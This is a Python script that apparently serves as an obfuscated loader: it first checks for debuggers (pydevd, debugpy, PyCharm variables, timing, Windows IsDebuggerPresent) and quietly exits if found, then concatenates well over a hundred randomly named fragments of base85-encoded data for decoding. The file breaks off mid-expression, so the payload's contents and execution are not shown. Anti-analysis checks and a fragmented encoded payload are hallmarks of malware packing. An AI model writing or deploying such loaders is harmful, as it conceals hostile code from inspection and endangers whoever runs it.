#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cx9uhHYKOv0j1I = 'Ugx^*t&pZh%KSw}yj*Q6UcAm=p|pK}gk*T@XegT<n&l3@$wfPQgGu_R1nMes%<6N-1F}'
_caLeGnVWJeBusd = '1A?yLkUZ0z0Z42#TIN&Emoa%uwuRZ&^AXI)wLRb-wIE$aH+TX!x>sW{*<bAI&#YrxT7Q'
_cvrLmXNtkkxVKe = '8CO9*-#=Xmt<-fWSVO+0}=dbJ4Pyjk-~Oc`G+U>rkOWsr_X%pa{p1h?J7Hi0kIRiS7XU'
_cklQGYhjPVnYEs = 'JPLw>>k~Fy~oUvy+Zo1A$29k=G9O=mI(cJQ4BaW*Noh$l4;~gATqkc0kH^>F>{dUo5eB'
_ctWapq3TAMWKZx = '_b+kQUw%4rn#)9k~${P2;6JGrdnc$%8+FeTm9_{2p^08|iwe>F(x=OXHsBE_A+;E}bq>'
_cyLD8Kf2E9fq4z = '6x*Dj!u++5+s1c;5KrSqIuMa8n%HsbH}zD4#TDJk%L!fZhwqD=lO5(nzUmZ?+7YcVOft'
_cnLHyo4VJmZIRB = 'JVm%b1zz|DU52cmoHz#G+WZuA-)U*g}n6&j3ey<wfvq_G$feuLgCrF|+Gf|_>i010{MZ'
_ceNyxEvoY6I7uL = '1Dcg)LKEQgcSde1GU~#$vMe$E6ge=7^X5Y_DVvhvY=pX!V*>7x_FxMe=F>LZ@cV!Eg%W'
_cpWSmkpiJaLS9B = 'EImm8(Zs30(KWBcYE2bP<*Beps_kk+|f^$FZCpn;eCr)&Z?JgWbcr<b143?e}l?Y5%A;'
_clE5iBBAT8y65N = '|oCSj^?nytq|)q`rX;)*UztgKPiw@6g<FCdbj?6mfE(aT+^+U!!5TbHl29j#u@Y!q(W$'
_crXULIFsbPsx3y = 'uz64WTjEy3G*Zy0^>l&!SprU6@`k}#J{_EAlPmjEtDFr?X6HF1vWNc7nUyxH%M9@f?J9'
_cmEiPqXyXJ4oaz = ')|4O+xgGmCi9<;G^@ZP#S;6K24>c3X^5D!Iul8MqepV~_I<ch(3-W*D0;0*t<E6a(Z@c'
_cxpMOYWVBaK_5U = 'ZGOFG-6}~MAQtI3l}xmVo0ixudMW%w#7a(^Q&N1{?|SE4GqMeDJ53Ko;e!HNxj1mqE@I'
_cfnIJX4rwaznfE = 'vH8I{*y^*>tTo*oV%7T}+;$zbc_nlGe7`IJ`f!_{xg~xK4!pb!3&N@wFv<AaeZ~vvPH3'
_cdZ1LRvvJXoMYd = '*&kFbT9>Sutlfz8ZR?;pPw&*2+CfLEbH-mA*jk*#Od?!RjoSIGa-VVwaOeE}%CF0{`xZ'
_cg1GvPZJeM10_h = '@tHn{TX0>S<7BkA<N-f@>?r>K%Q8#Z@=pat8zawHW)3vWbLc2v_i&il+$O0KUAySTrmU'
_ckqMUShCEB6Aqf = 'eENB`1j?Zb}1%!v(WNQ)#I=5E2>l>|(pEsSjzb|#qSv1rcu*TTUzYt{3w)mQC^7|zAJW'
_cmsc2ZXWwD3wMv = '6?&_b{KUEI?G6SMfy=1ZwkSgZ-B5FXW$<w^AN&RN2X4{l`~hUDdnjz?vqP0G0b_6Knq;'
_cvIlyyI8m5sEEb = 'Yn||q}91fB_<9nWNkqYNvo8e}(@fg47lEEEfk*vKaT40@J?HL^^KaIj#?UB`@#I9_uO_'
_c_tfoThhOOm4sj = '$J2!5u}`TCrTPu#0dVb-9{B<-ewvF1xEpvRS)J^M$6sCoD2EqwBxiNr6Kh6h0xDr<m(2'
_coHUlE4wCMuMNE = 'kNWS9xxO7z_jwHpPv;+QAQ5eNuTQ}AY1xwA95tNR->|X2Va!nnFkbM^A?8^Z$`@jOb0I'
_cmiax3VnP3PTZO = ')1?oA90DOH-Ld25y$O-qa5Qo0K*b*+DUVzCDT`mW~fRUQG&a)%WQD~)T#B*>juTdga+n'
_ckzkalg01eFxx0 = ')s5nIW!R9JYhJ7x$BHs1eEft6Eog@LFPS>pUJc>8v7KPZS2f_-69UxhFb=}>jg=0v$$S'
_czeXK66Azxndrq = 'NfxVV9;vdxOM|BB@v*m6`1^LT3|Mgmkail)&I_R+aG2XOUR(&n0jB2^IMzdly3Pj2JL9'
_cxn2rSmjkKiPhI = 'XlyEVs`}&0QHaTb4w$8lSmRZPnStW+^Dy94feBxGY)m95Ri%XO^7t0m=uUL%W2ah+his'
_cvxE8EHsdBUurG = '=!f-&EB7SLj+CS4x{8;;_xmB9aoK<?7>K%meCw$gjSDPe{BCH346j@>TV}Z135UM*fbW'
_cwXdu4SAZKExU8 = '@v?j-exS74F9PsB}ErUIZBc=Z=43-2QW1fNzDE~7UF{ffcTN^{yK3lSvahPtpj_`CHE^'
_cycq4ls1GNyo5b = 'n178+@hlC!Gk_)z^9&8vjMVhV)|r^G!t}ub@8q{S=A^^4d@AcUrX|42&$oI&w5C-Go)S'
_ciil4yfLOQCXN1 = '#;#+#B5fpu{)&O!@NrY1h{0FDLK&ThICKU9}x6U#=dX<>F)~5g8NyWH3M*IgFj6=S3FA'
_cl7c7r1_OraRdU = '-A&uIPtvZCcT$+LMti6v*DA_{xWQyx0-fCQ>R&V}Xz`Ae04}Kf*ecl2ip9F6E58W(Jq&'
_cyIJeC_QYRtoRG = ';<H0|xDf(!PO)$T4)8YL(YCQTwu^02orc~14EEz)*ZV|5pdYGv`E3R!kJO5}9)>xhz5R'
_cgru7XOImJtNvV = 'qIFOR6^dwU^ntXb-Xxv{NY76KtA>!5iX6Q-bMsAGkC0i)|PQ2!66kG&m#*5hHRqN!bAA'
_cwOrMILKT5sR0l = '*fqKb1y1v)rAz-l2>fm8QZq<IMM;})Yby<(gK=WxBvymFMXKV4dVHi?BIcP4o`(;QSyj'
_cjYOP5ylWKQRDK = 'CMKk;h9op-nrs25pMM^h|fJm~Fg8Q0W1FR5wS0Kv2$iF+~o~QsDFk^#Mts44%P_2w}!y'
_cb80GDGJcVrxjC = '(B~G%WvyJGp>_Uzf@ce~WAnC*foLQCF=+Pt}Ku?uEbTV#dk#&cT*z&Qdq}i)dpM+uLQn'
_c_Zi_fcmypKIJu = 'qwkFnp%a;eM~$Ew?icZlXrg}gaKyHit)Ej`1iZ6*0*|8lyi;F+Ktt{|EDxYLB$DSGxWD'
_cpzA7gW6jy6fjc = '{CM>t5|ie-9As<_E?f%coQW$i3D{XQ~~Q3*sZ^PbRnhGJtwhn?<Cj3#l7&zR-g>_t5w<'
_ceVz581vAwOy0n = 'I731dQ*R+k0y-GhQyHWuBPWIToqB2C^{=9U`};w2SnvuW(!N285(bD3lzdgrV8a1<2T8'
_ccb8EZ_SnKDz8j = 'f-4dKiM1WXRPNGcS;8Y#Ho|ivZFebzuv=;m}Ou1SIr9f>l^5b>^O<}>3Ij=;uE_BeL8w'
_ceXWMY36yW_aUo = '$7j*v5GJ8lv(k`QbW$s5`^VFZL*Q?zTh3f!0hUdkHmxm%bnsPpuK_2`_s(7*5_`6qB&a'
_cnOoIXZVzxzNbj = '?9n7?eQAaCcg&X~y$HvN0hDupgNtlBUm0R~wf9ixc29Q3k9tkO{H31s&4UWeL86e<lXQ'
_cpcb7Esd9r7i7d = '&3Tr2I|jRwx%Fl@3H!@rEwO<@?TO23i({Y4E>sBWmxLJ_+-0h0LDih(%Yl~Mhj7ySxK@'
_cwdgCpmvPdsB70 = 'l-*&ol*D}akRUFT0^$Jjz!g_fxmF<qwk(g`PBFEk~#T~Qcdk2v`l1@Givg%^1S#bAjJG'
_cdmjMJ91Kt08nU = 'ibI1BP^KWcNlZ^#y*In=eE6!kcYAQmo5m}X?@Ekzde!N6w$$ek5!7j0vD&#Wr?l^s^Dw'
_c_7iRJ8bkup6Dm = '(v$=vughJA`AXz_8BgoqMJ1B_DmavA0G|xOEL4r@ZHSC-X(>B$J;=o;A=y0H!n?Jp=61'
_c_wCajYsfa6wnT = 'ReJlh)I_Y5&MlPSPQ<mg<FgKO_n~3RF<>lYmE;|o;(+lGLs=0^i{NZ<#t$8uG&vKJb&!'
_chh7i0jgGSfFuu = 'TS+5ylSQ`gCoX<XwRmxpeP=T<$4HI-cKFoM?3jUH_lny*4>`^_W#mha_u_p}N{GJ)lcL'
_cpB7VYePtOD__L = 'VxXg;p1}|?~TRGZ&}fOmqDL#nFoP9j1Ix9xldU2UlJU6D>Eq1`-%6c5BwA8zRxA}*DZ_'
_cnEisFUOjIs6ep = 'pEnBJ0H6Vebk`x)>z|F+tGjLh`*v}<4eDz;jO+cwy$wi{EgKh8aDy&-Nv~;X;-NxIUX>'
_cv96blGPmEWhLZ = '*|MO=8krsquyr|8JN|woYsWVw~goT=6G4kT_9&R*+@tQ+wExihu=_U}%P++-m7~zx-yd'
_chzrg6m5I2Gbno = 'NKtrpkx9(IED~8Jq`LeEqxUJ<Mz07=8Q=K_6<)hT>(*>zU24ka08rn_0lQ?JETm0);}V'
_chaxKaJZ71iieX = 'pN>*jo0?T2&#H5?#<BekE%+9=TySx)I|tSY9xaeU8B7nEts_To6fR`t0cfyiCt_y=fL%'
_cc_DYGjhFW6vDg = 'Nt%8oimSrnsBSoYbgjau-D1l>uO9ztjDfDNYk{S^Dvo);EE9ytd;oYStcTK+Rx<*RskL'
_ctCPRl99pHmuwG = '(Z%P4Vwtw+MLuB5mU&>Oj+xP?vvDlgY17f0bfyvQZ8a;c>jr_~-^?L6*^+?@;*`dq7xO'
_cdu1qh97cOEsXH = 'Ug!tV+Mu0cHr!9mLg|hu|;Z0s~|H)i!3YZGJLvldZTbtJI&U?xg+i;;c#>(@VV;-iq`7'
_crLUndbINB7rpx = 'q{-^j#4Al5Ae1BEulnvOuHix~t_}00V%jL*Aqc5)&L0Y1D4q3uxOzh1mXF&Ro;?5sW&1'
_cx2g7_9slJZ68Z = 'btof+k(rBmgx1Ryiosc@aomX}}{=}yWZ;ReGMN+D^&4Vv&cr^s+}8?|5Q7n30>#5f`FU'
_cuOucmVTxBOGuV = 'c^2l_jnt5*_1|%Vfny*-Wg?Hl4)2Sr0cDlq7^WYeUK=3h)!3L@qx0P)^g;Y01=ZQVW#B'
_cgbPBzJP0IU4sY = '6kt2+@j{E2p0?$AwjE`Nmp*s7&)1y}rezwE!De|S+&NyAIK5EP2K&ac00ybysGfnSm7}'
_ceztZOLcuHXFSh = '(^P=(IThPxkf)SMb2}`$1NF8c3Rtq$l-2YyqrIyjsn_iKI=Kyun;5hf^oLF%4{a_eP$l'
_cdzxsV0BCvQ0Rt = 'Xr>yg*cZrKn(uNPwY=A(I%G(2)B(`^q}2BL6y9dSxLEwC{orFvEx2sxdMjz}U%Y^gtw8'
_cl7FjrF9ltSfOA = 'UNn8fpj3LPfLt$1x4s@{t--`QH8`QjAPBtC67PL@~k{l5jPKQAWZ1Wk5xT}7e|<1Jb=i'
_cnKLcGN2DFW7ZL = 'Ep44sy+eT6!og;(+)ShyJXt@Y122s+voN)yerFEd6L?BFWwGE>32ZcevjmRmVtdgjdI?'
_coCku96hbgiw1U = 'hdFEN5@iY#rMsl|Zf@pDPA4ZEDll6~r@a9YL=D=jYx$jbpuH#(L-hkHHi66`WOpaw0U('
_cmlWA7nwZzi4qK = 'FH<hx+)1N7R)hh`n4!`w(y`#b0QfiVVWdR0+WxC4hPS=XxMoaby73NyGb<ZvI!+EN_la'
_cqr5g6qryb6NF7 = 'ChjsQ3adV@2@Z~2sd?x0$IC8ltlh#j?ndYuay{=}V!xn4|2PsTSwA3d9rUQ^2gnRUgh2'
_cf31Cy5oJ2cqmC = 'Rnar~@6yq{tTw@CEZy)wEM(A)!s!*h_l(<3SMVRiDWxjJuVcr&Drm8813KJv_ief(UQF'
_ch6_csCwROhgWQ = '#)m<#atK{ub_!okt{2!q4ImriqCV1PbDGr@t($ORbpH-41~|>q<B=~fI@jm+}p+@2aNy'
_cquUhMzyGD3GwC = 'gf#}`sz#3mP1&d%W{0?Lx*^V?00fx_|TAofy^fsti&yAcs8RBTH%oqn30oyVjXLTfGAZ'
_cbuKrGuRf50ZTL = '$wS9<zDHwQ9qX32kxY@BUo$Uq3MbgMnYYA6ms?Rq|bc(D#qp$41D(*e>&yZK!w>#+}zc'
_cm2otxMPNmCuSB = 'C|A2pT_<DpnyxJRYq0}tAP@A}{^K)cpz7cmVOep<)S1(?hz7UcV2f&j15ITm6o!aBL8k'
_csjjq_KRhSkS9y = 'AG|8Ihrz$YuP%oG4m$a7;KLd~zLynVMZvcC^}PTfje;m596loL_El(`_F_jr|SB6A}>M'
_ch_NoYXIMQ4fxE = 'Ae8iNr3AR%zWiO>LFU=hpD9NGs-*QR*@X@S>xz!pY@!GOB6WfBjZkgEM*eH(imBT^WZi'
_clVv_ciSuRIL12 = '>2|BT01l#DJTJ=SCvq0UVyS-C+lxx@EhFqn96Uh{G5E<8{>Ts_r=3}yW!If(BziaPwuI'
_coDOEl0pv7cfBC = 'r$eP|J8uiYzH4o{ZeT{Vsg5Zvg+gzkA`{mMDz@KrPI0;BnP}^ivF`IlvY}UK~pOG%Q}s'
_crUro4sHcLPpKV = 'Kx(4leI2!}P@0@kmKCu(*c|wjFZ4Vve#WsYr`?9$g|D5=pOUM4o1?4ZFknmFKbj#>;du'
_cvYBhugjPZMlix = 'zHj{V<sajSb_ph3g$nt9a8mc9}o_`p$VAM9Mn3;5Q`>M&rh|6?_S+sO9!`WBFxOWhnLn'
_czGVA05mg5ttwr = ';zP$^f2{AjER~i7E+YZw>~^OKOzrDkZq^knN8_n!(e+AL6J+Mcl9HXQ0|iqL`d;A==3-'
_cek7jdNd7pn1Xy = 'keUVXRbguXv2oMQ(FtymTT;K!8A8;z8$-w#z+R-sYim`LWzET_Asg*5nL!0+@>@IDToi'
_clK0N9GRQadBdB = 'IKIoCQHdDQQ-iy3N>z3$xvwkTK4R4+Bx5!>5QaQ`7WvrX%sn;&LGK;p<Pg$iJHxCeZ;2'
_czoewouXy4Xq2F = 'HF*v#%l+l%eXGw26Yl?&dk<QbP;MfaRuyNW<N`u@?(NK90QqnTY)fp%iu&7*?tw7Ezh-'
_cmTfdn_x6z8Xiq = 'k=G@)`GinCLpCN}5kjL~NV8w&`LuutYNvGE}kgB}b+u?P?5JA;M)23>8(`9*~k(D&y@<'
_ct0Apl3jAKx_HF = '8NxF;lc_FhC7sisq$KplXVV8DaQW5TgQ_+&%@7*{6Kt>twE{IBUufj3c<(gMb%m2hH08'
_cfdKVsJRlUWD8P = 'OZvSH4h9f?GINi*RgD@u7D)U${&|<ehY6mhfyPI6?&Y`AzTDzBrJ3tLuxD??RXq-2V?>'
_cpshiPscDKxKD4 = 's4G1#kT803c@=8Qgg|-FH{epE7jx<Voyer&tcDqS}UN;%89!E7pAWIK7rgN#>a|W!B|6'
_cjE25sk4N14oO6 = '>3WD&%a4_HejSkVA+5Nn6+?SlFd@Er8F<i);;RriC)-AvH%{%57G+17aGMwkGH<C9t(8'
_chSBC3E9LIReLd = 'c#!ktB%CB6o4!A~2r0Iv3%2Z&N|P<7;3|ARuHCHGS9ZC30_xhQ0S&GCtKY1EgI1OM^a4'
_cnYcYw8QddtONQ = 'n|ShsZIlHq@(#5Dq2QNR22y|BKdmcx%G*R%n<+HpoI+Gp0g83S6B*F0zy18xK{t;{sH4'
_chF3PzeIj3cMOl = '`Cb!xs@&&n!W|!)kXjjyTAqv~@Wu!Or;e??8FEc2B<Ir6xHuq+fUY>?cd%BU~NjV5<t_'
_cmTWmtZTqfv_Uj = '%oe5;{SH{a6Dqb75u6xY^-_z^Usrh7`?j>9nKYuN+UGgYOax-vH|ECB<(&vfyL1yJS&?'
_cfkY9sALPormv_ = 'u!4__kVkVojXU=I3~D=d9QzKUkJFn9LVSz|XQ_O>$u^%~M<TQCKKyNeAs2c@bn2)T%02'
_cmcoFGYjbR3dZ8 = 'zgH7fPm<2{HbCrx_Nb3lhH@Ymkuy94W-pywS#02fE-4L{{68JEU<HEXLbuND#*z~j*=U'
_cvAetfIJ0UZ8C6 = 'uk+#QT&FtZ4S=(X?ggNGIEd<E88(&<rkaM$~%*LDz*9S-lzC&|9M5-Vs}!fywIkMYPOP'
_ccXaC91RhXlAsU = 'Z-{q-{Q0LpA`L@3rAYo=OX<GPUV0nysYxutB1N56)LKlVkT)k(`nO3sy5A+Eo#iQKcV}'
_cxHkkbEwefVDgU = 'f0wqS1W3Zie=Cx~GHpvL>1%^?M}2h2(~~T3^zX)d;pc#zG$W4<Kj>+hEy*mCc8BuICVy'
_c_O_1zoO2_h1aR = '#>}xlTA~EYU9$O1Y2DYOn)qc5m!tOA`RYjG5|std9^H@uYAYmI^2rkktYvFhOP!qG49|'
_cqwqJgZ8T_Ebj_ = 'M?rM2fiyh{+ghLdlkNgrr%*BF7Z%|O?{QCMMD;WtUC>%(<w7%Qh%^7l7$I&<M_$a<%Xj'
_cyy6FM1FhOxnWE = 'HP0^_rdmgKZ%={BRii(hqCH1-PDyHF~3Q#&0%{Ppy<7@WVASmueny6KNBp;MB1gQ^1=j'
_cdcEkMy5vgMIZj = '2x)Ee|heP55n_m{c!O*<7X&VJ-MT9+&p93$HH?sMK(aHQ!7dbEq{odYPK3+F}vCNv2ne'
_cjT_xSZKqxffHb = 'B(Ni-o5stHb(^-x6VsjM1`#4TXgvD}3l490Z%|5c<N8e{`$tN8|iE{x&4rJanpi`G~tP'
_cqmNdOQJ9IpICf = '>}EE`kd<K)Y1^DY&M(7gE#FwN-j3sexYv0-7*vB7xCGl2E2!v+&HZ|)d{8=ZL9u~1F!B'
_cmQpUrMhJB1_Zq = 'VD9CqQNN?P3)mKZv+XFmyvma;F#Vqu3CnJtJC0E!d`Ft9G4Q%JwKhp05~BcTcAGRrT+S'
_cnWG6rnbK27_IC = 'HrV7>6@GIaPgZ2arC<TUDw7ZtZ#j}?_Aq0P$=z+%y0E1+~Fr6g%_E=ZG7@5%Y6!xTikZ'
_cybyOxC4aFq2kU = '+)>+1?zzR6)nv;KdWHq>5!akyKu!^C9Lc<y2!|gp@y)$D$iEPmX_l~80jlN!FQ=!!W;<'
_cbljT0rHFSxuUN = 'qtHboe9nJ+&|+t1*s>xut4>_c@ed%H%VG>gX7CxB`tz$=t4XcUE>F0%h+ksg$|vy4DtF'
_cfFV_AqZ1p4s0S = 'kKZ@V;ZgxKfHp>H^p+Q*^PSgV*TV6^pSgWDSQ%8hVg@c5a&Wh7?qTsNOZ`c)pJ?fXfr?'
_cz8ODYkZC4GEJ7 = 'E11%sRvf7Fuw8H2iE#83>f3%BBU2F9HLV){C@uv%g8&i0S5SJwD8(yfGeRe6t&Cjc{Zg'
_ckoK_GEVlcoCvn = '8g>HKho8tAP(%xP0yA1a>333qluK=0zBrCZ(E{L&Zv~em~3aJf~l*?aV7wH!nBs_rZF1'
_ck3PXSLTfSue4w = '^&#$=H&5`i42lzUFDYD;Lzxmy9dGNgMwnO(DgI7L$*m225)@~Ab4797%ks}O{58__cGO'
_chT_XqGaFHvQaA = '4zcG$6NWnk!nTkYzxVnbV=t65}Nl<qoDt<*-zploT+3F1pgagIUS;+VM17Ob|+cU%{gv'
_ceYuPm5HDv8Sy6 = 'BXx%Z8|!9}>2fipTm8zgO&#)6<<7N*HzwjIvlZi43XfzJ(69aJpyV!*;$(d6Ds?G#Blu'
_corGaP9cra9cYS = 'PyT4O8s(2$+&uEg^8j9Kg*t2DvyK!~Z1F?X*7nCd7{oO<N4JuqH%t(Q&c6L;5^G=B=`a'
_csFoNG33xOYXGa = 'xL^OtUJP17uHsDn(rT@3i6E3h1iC&9ZC<5&qFFFhFNQ#8Am0%sRbJ7IVXr#yU}-0p37#'
_cwKok3W9PI9ecK = '9aj;?WL~eHHi^<b?T`F0AUgS>d`k+lbI9y1Dn<|@~Hkwu&#fgYz-s!Eo<DKmdE&5^}+('
_cxgkiODr4TjZ8m = '!k^OA3%zmF7QkEvan;XD~Bxc-Fw9?)Yd;-&p0lg*4T}*+Ql{2|DFC#6q%Zo)O-pf9Jzs'
_ct9pgxkpvKWbW2 = 'Rry94VNf)G_6<tm`;v{@fhK3X8U)_Pi}I-r`+Blnigsw~OA`bKl67bILwW>ap;jJ|7|Z'
_cumK0H1pXelws1 = ')<iX?*mV$Ok-;1)jl(6GjuFR7B;lj>1nIGviV%rosm2~ASCc_5Jr+z4-bQ`Hc7rRt1XR'
_cjsuqdnJqSJmZS = 'lxQrs(ETdN|n9}lELS62xZJM+%~2~0v>mgXgg$^7{U}wDF~V5JWQC&9WwYIbM@<)s%}5'
_cyg4FLs1SciEN5 = 'q!Q&fHZT;ub6)TmP+oMkr62#WS8g5(vTtu{M&d(uEcqxUQ;{T~MoTfsku8r!&gg|@Yzk'
_cvUl_DE8XomWyl = '@PqxAIHWc1qtHUX_1Bq8Ee-ZrI4MvC2Ee{^d}4w<sH`tEKkSAJM;tgt>?6xKdid<&BfU'
_clwd02S96UBPiC = '4f~+6$(m60y*t9W)4m<3`tu8%o6`uU8nm#$**k-C*j}3REXq_%S!=w4-Owug=Vb2Or;>'
_cqI5n31Jf2YTlI = 'q5)vd298Y_+~0V7~&c7rcW!Y8Dfq|pgFvx7Es;%&(JwSbN4y95J>i?L@R_naz8V$b<tL'
_ckl04tElmb72Eb = 'JKI7wV0I^%CE_G*dEsOM)p16qMI(4>r$~-N`NlZX9$|#CA@*%{7kh0XE_ie=~mFk+sg}'
_cngZyzBmChzerR = '}nG{)}xifSOc$nHX*sx<ZFRc1R!dip;-eBcrY~q$9krS4qqQ>rMji!tV4ntZ03DAqlo;'
_cthNBtlczICwUL = '5;@bIS%AdckU6hN>NfCPN!YcE{-LMdYKj{A|*BRs2?yg}U8NYC|3~+h^7Ll)n9Q(3W?w'
_cqXWI2NGcs6YbP = '4yu7O`@2yJYceP67XC|=hgM1`Z!K<5Jsz2RS~*EhdW1Y4xcLBwcEH!b>wNO9J!#JDS>4'
_csTYPFMcI2Jtw6 = 'T)R0!ze``@l|{S!FO1O!U{Hikeg6z<l1iWs*y3DI(@=s~F5E`u+8aCAD%w@w+QKkmGSj'
_cccKbL9FeorCCN = '1+?jw*uz71E<gS#&(o>HFq~hzBVWp+};hLyom5OH3Xb7|J2H0^!8+Ti+oGm7iXafWZ#<'
_cibSc22cZphDNE = '^q&20fuP=O9;P|(ak|M|E=WPyP<A{HwCtmq<EJXR5Can#VWp|5~Pi`FN*od#XOu&S{rB'
_cavq431Oy5vbE1 = 'U<uv&tW`)wdfQO;ej%?=*u90Jg?e@+miv!}MuTp%jHYmeZbV#Jpcumt0dRw>Esl2L$)L'
_czx5i07lkXr9SR = 'tPgi480}<56eL{41CuRCDvY&)w$*TC04(E<f|NdaW7waL4^QCm_Qq9mH3#=K1#QXy7f@'
_cn1xGdmqA2q__5 = 'Yp1hx@~2PoUxqw?#ee7!Sa2XO!PuTcSSUKjHyfvn^==o7b!NvK(;8}=V%{K#3ZKgovek'
_cduhIAeD_39aj9 = 'A!MpFSlf!GhI9nYr%h&qqTwjP8zLyN9RC13MyT+L~J6q&^Po#Z)B%p-aioU{9ro?r>*v'
_cwSSoanI4QOPo_ = '=G=}ryz8v%%ku@N#pOEI)9V}ClIUGI<1l})kR8J5_)HQgD0ehze)H+T5n<$SA8?y@b#{'
_cwRERGVz4LLxVv = '2r%6GE5&uq(Q%KvRuB^h>}qwMM(u^<Dwnz|f4BjVm_Q%d)fjR>}#U=|sMM>JM|~YNX|l'
_cqurTAtfWarhVw = '=KgGR603HF`(;KTkbIfSMUDR7o>)F2ha%m3e67?oHbc;8tNkJ49cF^+r3r&E?A7oWoXw'
_cfygdnJk990RUU = 'O;VX|wAf@1JK<=NYveVcMjw;6~{2zZaJf~_d8X)C)p1bVeFJrM(h5;3@c7X`*}vQ_i{K'
_cutCfzXxOPMjvt = '$l$mX5Oo#g+}Ctzw;a!R`l9U<r^Jqi7zQ#b_#HqNj|=ZoyNP=G9@Iy?%fA84M$jJZW!a'
_cnpBGUQMkCCYo1 = 'F5UU{4^;HiM{v(Zi;Nn=!N!Sp1${2X$166rZ)*R-zgUo>3(Uu4MTma9YKt|5)5O|>M_S'
_cmgUqNbcE6bYqx = '3!$2*DGPDSi-%1qzv7vMg^sr2F#2qNCwWmT7Ust)Yp5luLbu)w~rBwv4q>)kXVAn|Y^z'
_cfbIZPwnikyohy = 'zWR}*BVm(Nfm(uRZA>QN$->B0BXm_MR%|6Wkv^rB4CRl!q%Czvb&I+K6`L?l0VsMNY2A'
_cmgaGOmyVW8K3X = '-ygl-K0iONF84w4Y<{`Mrh>*`u|Ho#+JoPRfnGUzd9;^kAzkJZ>giJl}_ar1bnZp@#47'
_cjroxe8jfZfr1e = 'u{&-66mt5vy~c_qP`LvV<G<FkhTAHP_|j3n`M2&bHHg=G2uva!to#4Ac^V1jvi4TF7s#'
_cqTpOzmM4xDty7 = 'iUZ;hH0S*M4=PjlmztwlGCkSkD`%x4rsR3ot|5vTANu9e5p>8B*juG10^gJ5-t+B;B?2'
_cbcTqdJYUPGAW2 = 'Sb(r<Np&ocFWr`^?m`)FM^YkaY_2(?LtL^`cC7pJq!Lv{&POdVuhAo_V?xb$0m~o(h#u'
_ckYWC3j7K7K50I = 'qPfvam~dub$eYEZUz-X7m@@z}&eK!iY7@lsi#8M$O%9_(N@wCx7g-{h|0of#3`n!Byv='
_ctdZOUG_8UPkmL = 'A=L>?=eevJujzGnSU!JI@<G7b1`biy5BIwayW2ybbGH;&q+vwp74N&|gbErYdb{$BL(9'
_cu2XO0BtRuWeuD = '%bPM+*D?CM@tFNgh8SGP;)p(^ho0G@FBz-;=;q^TKM<#1;OhlpjYM}fwgtGF9~t@3Hbq'
_czMKGuS0ba35Fx = 'mg!p%$^!1P<1_Sw<D}772!)XbOv*Zfks(?a4WB_p()&&97>3hM3SSub3k^Hk9jcmAYp_'
_chnUjFkpmfGc3n = '#=&h0Es|NpAhrd07'

_poqTczfxtHXgJd = __import__('base64').b85decode(_cx9uhHYKOv0j1I + _caLeGnVWJeBusd + _cvrLmXNtkkxVKe + _cklQGYhjPVnYEs + _ctWapq3TAMWKZx + _cyLD8Kf2E9fq4z + _cnLHyo4VJmZIRB + _ceNyxEvoY6I7uL + _cpWSmkpiJaLS9B + _clE5iBBAT8y65N + _crXULIFsbPsx3y + _cmEiPqXyXJ4oaz + _cxpMOYWVBaK_5U + _cfnIJX4rwaznfE + _cdZ1LRvvJXoMYd + _cg1GvPZJeM10_h + _ckqMUShCEB6Aqf + _cmsc2ZXWwD3wMv + _cvIlyyI8m5sEEb + _c_tfoThhOOm4sj + _coHUlE4wCMuMNE + _cmiax3VnP3PTZO + _ckzkalg01eFxx0 + _czeXK66Azxndrq + _cxn2rSmjkKiPhI + _cvxE8EHsdBUurG + _cwXdu4SAZKExU8 + _cycq4ls1GNyo5b + _ciil4yfLOQCXN1 + _cl7c7r1_OraRdU + _cyIJeC_QYRtoRG + _cgru7XOImJtNvV + _cwOrMILKT5sR0l + _cjYOP5ylWKQRDK + _cb80GDGJcVrxjC + _c_Zi_fcmypKIJu + _cpzA7gW6jy6fjc + _ceVz581vAwOy0n + _ccb8EZ_SnKDz8j + _ceXWMY36yW_aUo + _cnOoIXZVzxzNbj + _cpcb7Esd9r7i7d + _cwdgCpmvPdsB70 + _cdmjMJ91Kt08nU + _c_7iRJ8bkup6Dm + _c_wCajYsfa6wnT + _chh7i0jgGSfFuu + _cpB7VYePtOD__L + _cnEisFUOjIs6ep + _cv96blGPmEWhLZ + _chzrg6m5I2Gbno + _chaxKaJZ71iieX + _cc_DYGjhFW6vDg + _ctCPRl99pHmuwG + _cdu1qh97cOEsXH + _crLUndbINB7rpx + _cx2g7_9slJZ68Z + _cuOucmVTxBOGuV + _cgbPBzJP0IU4sY + _ceztZOLcuHXFSh + _cdzxsV0BCvQ0Rt + _cl7FjrF9ltSfOA + _cnKLcGN2DFW7ZL + _coCku96hbgiw1U + _cmlWA7nwZzi4qK + _cqr5g6qryb6NF7 + _cf31Cy5oJ2cqmC + _ch6_csCwROhgWQ + _cquUhMzyGD3GwC + _cbuKrGuRf50ZTL + _cm2otxMPNmCuSB + _csjjq_KRhSkS9y + _ch_NoYXIMQ4fxE + _clVv_ciSuRIL12 + _coDOEl0pv7cfBC + _crUro4sHcLPpKV + _cvYBhugjPZMlix + _czGVA05mg5ttwr + _cek7jdNd7pn1Xy + _clK0N9GRQadBdB + _czoewouXy4Xq2F + _cmTfdn_x6z8Xiq + _ct0Apl3jAKx_HF + _cfdKVsJRlUWD8P + _cpshiPscDKxKD4 + _cjE25sk4N14oO6 + _chSBC3E9LIReLd + _cnYcYw8QddtONQ + _chF3PzeIj3cMOl + _cmTWmtZTqfv_Uj + _cfkY9sALPormv_ + 